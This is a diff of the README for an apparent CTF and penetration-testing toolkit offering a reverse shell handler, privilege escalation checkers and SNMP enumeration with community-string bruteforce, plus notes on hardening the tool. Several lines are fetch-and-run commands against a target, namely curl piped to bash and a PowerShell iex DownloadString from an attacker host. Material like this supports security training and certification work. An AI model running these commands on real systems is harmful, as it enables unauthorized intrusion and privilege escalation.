@@ -8,11 +8,14 @@
 
 - **Web Interface**: Intuitive web-based control panel for all tools
 - **Reverse Shell Management**: Receive and interact with reverse shells
-- **File Transfer**: Secure file upload/download with MD5 verification
+- **File Transfer**: Secure file upload/download with SHA256 verification
 - **Tool Management**: Built-in tool repository and management
 - **Multi-Clipboard**: Share clipboard content across machines
 - **Network Discovery**: Automatic IP discovery
-- **Recon Scripts**: Pre-built privilege escalation helpers for Linux and Windows
+- **Privilege Escalation Tools**: Comprehensive privesc checkers for Linux and Windows
+- **SNMP Enumeration**: Automated SNMP reconnaissance with community string bruteforce
+- **Rate Limiting**: Thread-safe rate limiting to prevent abuse
+- **Security Headers**: XSS, clickjacking, and MIME sniffing protection
 
 ## Installation
 
@@ -98,8 +101,8 @@ python shell.py 443
 ```
 
 Commands available in shell:
-- `upload <local_file>` - Upload file to remote machine
-- `download <remote_file>` - Download file from remote machine
+- `upload <local_file>` - Upload file to remote machine (with SHA256 verification)
+- `download <remote_file>` - Download file from remote machine (with SHA256 verification)
 - `help` - Show available commands
 - `exit` - Close the connection
 
@@ -133,58 +136,79 @@ shellpy 10.10.10.10 443 -powercat --obfuscate --macro
 
 ![Shellpy Example](https://github.com/user-attachments/assets/9bb1efe9-bcaa-49b8-b99b-b865b758eefe)
 
-### Reconnaissance Scripts
+### Privilege Escalation Scripts
 
 #### Linux Privilege Escalation
 
-Load the recon script on target:
+Download and run the privilege escalation checker:
 
 ```bash
-. <(curl http://10.10.10.10/recon.sh)
+curl http://10.10.10.10:5000/downloads/privesc_linux.sh | bash
 ```
+
+Or run it locally:
+
+```bash
+./downloads/privesc_linux.sh -q   # Quick wins only
+./downloads/privesc_linux.sh -f   # Full enumeration
+./downloads/privesc_linux.sh -l   # Full + LinPEAS
+./downloads/privesc_linux.sh -p   # Full + pspy
+```
+
+Features:
+- **Quick Wins**: sudo -l, SUID binaries, capabilities, docker group, writable /etc/passwd
+- **Full Enumeration**: kernel exploits, interesting files, services, polkit/PwnKit
+- **LinPEAS Integration**: Automatic download and execution
+- **pspy Integration**: Process monitoring
+- **Organized Output**: QUICK_WINS.txt with high-priority findings
+- **CTF-Focused**: Based on public CTF techniques and OSCP methodology
+
+See `tools/PRIVESC_GUIDE.md` for complete documentation.
 
 #### Windows Privilege Escalation
 
-Load the recon script on target:
+Download and run the privilege escalation checker:
 
 ```powershell
-iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
+iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:5000/downloads/privesc_windows.ps1'))
 ```
 
-Available functions:
+Or run it locally:
 
-**Auxiliary Tools:**
-- `aux.upload [file]` - Upload files via HTTP POST
-- `aux.download [file]` - Download files via HTTP GET
+```powershell
+.\downloads\privesc_windows.ps1 -Quick   # Quick wins only
+.\downloads\privesc_windows.ps1 -Full    # Full enumeration
+.\downloads\privesc_windows.ps1 -WinPEAS # Full + WinPEAS
+```
 
-**Reconnaissance:**
-- `recon.sys` - System information
-- `recon.users` - User information
-- `recon.programs` - Installed programs
-- `recon.protections` - Security protections
-- `recon.process` - Running processes
-- `recon.networks` - Network configuration
-- `recon.portscan <host> [range]` - Port scanner
-- `recon.pingscan <subnet>` - Subnet scanner
+Features:
+- **Quick Wins**: AlwaysInstallElevated, unquoted service paths, writable service binaries
+- **Token Privileges**: SeImpersonatePrivilege, SeDebugPrivilege detection
+- **AutoLogon Credentials**: Automatic detection
+- **Scheduled Tasks**: Writable binary detection
+- **WinPEAS Integration**: Automatic download and execution
+- **Organized Output**: QUICK_WINS.txt with high-priority findings
 
-**Privilege Escalation:**
-- `priv.installElev` - AlwaysInstallElevated check
-- `priv.serv.dir` - Service directory permissions
-- `priv.serv.reg` - Service registry permissions
-- `priv.serv.unq` - Unquoted service paths
-- `priv.cred.files` - Credential files
-- `priv.cred.history` - Command history
-- `priv.owned.files` - User-owned files
-- `priv.search.fname` - Search filenames
-- `priv.search.fcontent` - Search file content
-- `priv.autorun` - Scheduled tasks
+### SNMP Enumeration
 
-**Active Directory:**
-- `ad.users` - Domain users
-- `ad.computers` - Domain computers
-- `ad.groups` - Domain groups
-- `ad.spn` - Kerberoastable accounts
-- `ad.asrep` - AS-REP roastable users
+Automated SNMP enumeration based on OSCP methodology:
+
+```bash
+./tools/snmp_enum.sh -t 10.10.10.92 -q   # Quick scan
+./tools/snmp_enum.sh -t 10.10.10.92 -f   # Full enumeration
+./tools/snmp_enum.sh -t 10.10.10.92 -C /path/to/wordlist.txt  # Bruteforce communities
+./tools/snmp_enum.sh -t 10.10.10.92 -a   # All techniques
+```
+
+Features:
+- **Community String Bruteforce**: Using onesixtyone
+- **Full SNMP Walk**: From root OID (not default OID 2)
+- **Extended MIB Enumeration**: NET-SNMP-EXTEND-MIB for RCE vectors
+- **Specific OID Checks**: Users, software, ports, processes, system info
+- **Multiple Targets**: Support for target list files
+- **Organized Output**: Separate files for each enumeration type
+
+See `tools/SNMP_ENUMERATION_GUIDE.md` for complete documentation and OID reference.
 
 ## Architecture
 
@@ -197,27 +221,38 @@ Available functions:
 - **Custom Exception Hierarchy**: Proper error handling
 - **Audit Logging**: All operations logged with timestamps
 - **Log Injection Prevention**: Sanitized logging
+- **Rate Limiting**: Thread-safe rate limiting with sliding window algorithm
+- **SHA256 File Verification**: Cryptographically secure file integrity checks
+- **Persistent SECRET_KEY**: Session persistence across restarts
 
 ### Project Structure
 
 ```
 CTF-toolkit/
-├── app.py                 # Main Flask application
-├── shell.py              # Interactive shell client
-├── listen_manager.py     # Reverse shell handler
-├── config.py             # Configuration management
-├── exceptions.py         # Custom exceptions
-├── validators.py         # Input validation
-├── security_headers.py   # Security middleware
-├── logging_config.py     # Logging configuration
-├── reload.py             # Development auto-reload
-├── templates/            # HTML templates
-├── static/              # CSS, JS, images
-├── tools/               # Exploitation tools
-├── uploads/             # Uploaded files
-├── downloads/           # Downloaded files
-├── logs/                # Application logs
-└── tests/               # E2E test suite
+├── app.py                       # Main Flask application
+├── shell.py                     # Interactive shell client
+├── listen_manager.py            # Reverse shell handler
+├── config.py                    # Configuration management
+├── exceptions.py                # Custom exceptions
+├── validators.py                # Input validation
+├── security_headers.py          # Security middleware
+├── rate_limiter.py              # Thread-safe rate limiting
+├── logging_config.py            # Logging configuration
+├── reload.py                    # Development auto-reload
+├── templates/                   # HTML templates
+├── static/                      # CSS, JS, images
+├── tools/                       # Exploitation tools & guides
+│   ├── snmp_enum.sh            # SNMP enumeration automation
+│   ├── SNMP_ENUMERATION_GUIDE.md
+│   └── PRIVESC_GUIDE.md        # Privilege escalation guide
+├── downloads/                   # Privilege escalation scripts
+│   ├── privesc_linux.sh        # Linux privesc checker
+│   └── privesc_windows.ps1     # Windows privesc checker
+├── uploads/                     # Uploaded files
+├── logs/                        # Application logs
+├── tests/                       # E2E test suite
+├── CODE_REVIEW_REPORT.md        # Security analysis report
+└── TODO.md                      # Future improvements
 ```
 
 ## Development
@@ -264,13 +299,42 @@ This toolkit is designed for:
 - Security certifications (OSCP, etc.)
 - Authorized security assessments
 
+**⚠️ Security Status:** Moderate Risk - See `CODE_REVIEW_REPORT.md`
+
+**Suitable for:**
+- ✅ CTF competitions
+- ✅ Controlled lab environments
+- ✅ Security training
+
+**NOT suitable for:**
+- ❌ Public internet without authentication
+- ❌ Production environments without hardening
+- ❌ Untrusted networks
+
 ### Security Best Practices
 
 1. **Never expose to the internet** - Use only in isolated lab environments
-2. **Change default credentials** - Set `SECRET_KEY` in production
+2. **Set SECRET_KEY** - `export SECRET_KEY="your-secret-key-here"`
 3. **Use HTTPS** - Set `USE_HTTPS=True` when deploying with TLS
 4. **Review logs** - Check `logs/` directory regularly
 5. **Limit access** - Use firewall rules to restrict access
+6. **Check TODO.md** - Review pending security improvements
+
+### Recent Security Improvements (2026-08-11)
+
+- ✅ **Fixed SECRET_KEY regeneration** - Now persists across restarts
+- ✅ **Replaced MD5 with SHA256** - Cryptographically secure hashing
+- ✅ **Thread-safe rate limiter** - No race conditions
+- ✅ **Comprehensive code review** - See `CODE_REVIEW_REPORT.md`
+- 📋 **TODO.md** - Planned improvements for authentication, CSP, input validation
+
+### Known Limitations
+
+See `CODE_REVIEW_REPORT.md` for detailed security analysis including:
+- No authentication/authorization (planned)
+- Command injection vectors in shell operations (to be fixed)
+- Permissive Content Security Policy (requires HTML/JS refactor)
+- See `TODO.md` for complete list of planned improvements
 
 ## Contributing
 
@@ -318,7 +382,27 @@ This project is provided for educational and authorized security testing purpose
 
 ## Changelog
 
-### Recent Improvements
+### Version 2.0 (2026-08-11) - Security Hardening
+
+**New Features:**
+- ✨ Privilege escalation checkers for Linux and Windows
+- ✨ SNMP enumeration automation with community bruteforce
+- ✨ Comprehensive privilege escalation guide (PRIVESC_GUIDE.md)
+- ✨ SNMP enumeration guide with OID reference
+- ✨ Thread-safe rate limiting implementation
+
+**Security Fixes:**
+- 🔒 Fixed SECRET_KEY regeneration issue (now persists)
+- 🔒 Replaced MD5 with SHA256 for file integrity
+- 🔒 Added thread-safety to rate limiter
+- 🔒 Comprehensive security code review completed
+
+**Documentation:**
+- 📚 CODE_REVIEW_REPORT.md - Complete security analysis
+- 📚 TODO.md - Planned improvements and roadmap
+- 📚 Updated README with new features and security status
+
+### Version 1.0 (Previous)
 
 - Type hints and comprehensive docstrings
 - Custom exception hierarchy
@@ -327,7 +411,6 @@ This project is provided for educational and authorized security testing purpose
 - Security headers middleware
 - Comprehensive logging with rotation
 - E2E test suite (33 tests)
-- Security vulnerability fixes
 
 ## Support
 
